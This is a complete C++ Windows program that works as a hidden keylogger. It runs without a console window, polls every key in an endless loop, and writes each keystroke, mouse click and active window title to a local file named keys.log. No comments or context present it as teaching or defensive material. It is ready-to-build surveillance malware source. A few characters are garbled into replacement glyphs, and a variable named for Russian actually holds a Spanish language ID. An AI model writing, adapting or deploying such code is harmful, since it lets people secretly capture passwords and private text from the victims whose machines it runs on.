
#include <windows.h>
#include <fstream>
#include <string>

using namespace std;

#define VK_OEM_1          0xBA   // ';:' for US
#define VK_OEM_PLUS       0xBB   // '+' any country
#define VK_OEM_COMMA      0xBC   // ',' any country
#define VK_OEM_MINUS      0xBD   // '-' any country
#define VK_OEM_PERIOD     0xBE   // '.' any country
#define VK_OEM_2          0xBF   // '/?' for US
#define VK_OEM_3          0xC0   // '`~' for US

const char filename[] = "keys.log";

int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
  string lastTitle = "";
  char d;
  ofstream ofs(filename);

  wchar_t wChar;
  char title[1024];
  byte lpKeyboard[256];
  DWORD processId;
  HWND hwnd;
  HKL kLayout;

  WORD rusLangId = MAKELANGID(LANG_SPANISH, SUBLANG_DEFAULT);

  while(true)
  {
    Sleep(1);

    hwnd = GetForegroundWindow();
    GetWindowText(hwnd, title, 1023);
    if(lastTitle != title)
    {
      ofs << endl << "Window:";

      if(strlen(title) == 0)
        ofs << "No active window";
      else
        ofs << "'" << title << "'";

      ofs << endl << "Keys:";
      lastTitle = title;
    }

    kLayout = GetKeyboardLayout(GetWindowThreadProcessId(hwnd, &processId));

    for(unsigned char c = 1; c < 255; c++)
    {
      if(GetAsyncKeyState(c) & 1)
      {
        switch(c)
        {
        case VK_LBUTTON:
          ofs << "<LMOUSE>";
          break;

        case VK_RBUTTON:
          ofs << "<RMOUSE>";
          break;

        case VK_MBUTTON:
          ofs << "<MMOUSE>";
          break;

        case VK_RETURN:
          ofs << "<RETURN>";
          break;

        case VK_LSHIFT:
        case VK_RSHIFT:
        case VK_LCONTROL:
        case VK_RCONTROL:
        case VK_LMENU:
        case VK_RMENU:
          break;

        case VK_SHIFT:
          ofs << "<SHIFT>";
          break;

        case VK_CONTROL:
          ofs << "<CTRL>";
          break;

        case VK_MENU:
          ofs << "<ALT>";
          break;

        case VK_BACK:
          ofs << "<BACKSPACE>";
          break;

        case VK_TAB:
          ofs << "<TAB>";
          break;

        case VK_ESCAPE:
          ofs << "<ESC>";
          break;

        case VK_PRIOR:
          ofs << "<PAGE UP>";
          break;

        case VK_NEXT:
          ofs << "<PAGE DOWN>";
          break;

        case VK_END:
          ofs << "<END>";
          break;

        case VK_HOME:
          ofs << "<HOME>";
          break;

        case VK_LEFT:
          ofs << "<ARROW LEFT>";
          break;

        case VK_UP:
          ofs << "<ARROW UP>";
          break;

        case VK_RIGHT:
          ofs << "<ARROW RIGHT>";
          break;

        case VK_DOWN:
          ofs << "<ARROW DOWN>";
          break;

        case VK_INSERT:
          ofs << "<INS>";
          break;

        case VK_DELETE:
          ofs << "<DEL>";
          break;

        case VK_LWIN:
        case VK_RWIN:
          ofs << "<WIN>";
          break;

        case VK_MULTIPLY:
          ofs << "<NUM *>";
          break;

        case VK_ADD:
          ofs << "<NUM +>";
          break;

        case VK_SUBTRACT:
          ofs << "<NUM ->";
          break;

        case VK_DIVIDE:
          ofs << "<NUM />";
          break;

        case VK_CAPITAL:
          ofs << "<CAPS>";
          break;

        case VK_NUMLOCK:
          ofs << "<NUM>";
          break;

        case VK_SCROLL:
          ofs << "<SCROLL>";
          break;

        case VK_SNAPSHOT:
          ofs << "<PRINT SCREEN>";
          break;

        case VK_PAUSE:
          ofs << "<PAUSE>";
          break;

        case VK_DECIMAL:
          ofs << "<NUM .>";
          break;

        case VK_OEM_PLUS:
          ofs << "+";
          break;

        case VK_OEM_COMMA:
          if(LOWORD(kLayout) == rusLangId)
            ofs << "�";
          else
            ofs << ",";
          break;

        case VK_OEM_MINUS:
          ofs << "-";
          break;

        case VK_OEM_PERIOD:
          if(LOWORD(kLayout) == rusLangId)
            ofs << "�";
          else
            ofs << ".";
          break;

        case VK_APPS:
          ofs << "<APP>";
          break;

        case VK_OEM_1:
          if(LOWORD(kLayout) == rusLangId)
            ofs << "�";
          else
            ofs << ";";
          break;

        case VK_OEM_2:
          ofs << "?";
          break;

        case VK_OEM_3:
          ofs << "~";
          break;

        case VK_OEM_4:
          if(LOWORD(kLayout) == rusLangId)
            ofs << "�";
          else
            ofs << "[";
          break;

        case VK_OEM_5:
          ofs << "\\";
          break;

        case VK_OEM_6:
          if(LOWORD(kLayout) == rusLangId)
            ofs << "�";
          else
            ofs << "]";
          break;

        case VK_OEM_7:
          if(LOWORD(kLayout) == rusLangId)
            ofs << "�";
          else
            ofs << "'";
          break;

        default:
          if ( (c >= 0x41 && c <= 0x5A) || (c >= 0x30 && c <= 0x39) || (c == VK_SPACE) ){
            GetKeyboardState(lpKeyboard);
            ToUnicodeEx(c, MapVirtualKey(c, 0), lpKeyboard, &wChar, 2, 0, kLayout);
            WideCharToMultiByte(CP_ACP, 0,  &wChar, -1, &d, 1, NULL, NULL);
            ofs << d;
          }
          else if (c >= VK_NUMPAD0 && c <= VK_NUMPAD9)
            ofs << "<NUM " << (c - 96) << ">";
          else if (c >= VK_F1 && c <= VK_F12)
            ofs << "<F" << (c - 111) << ">";
          else
            ofs << "<UNKNOWN>";
          break;
        }
        ofs.flush();
      }
    }
  }
  ofs.close();
  return 0;
}
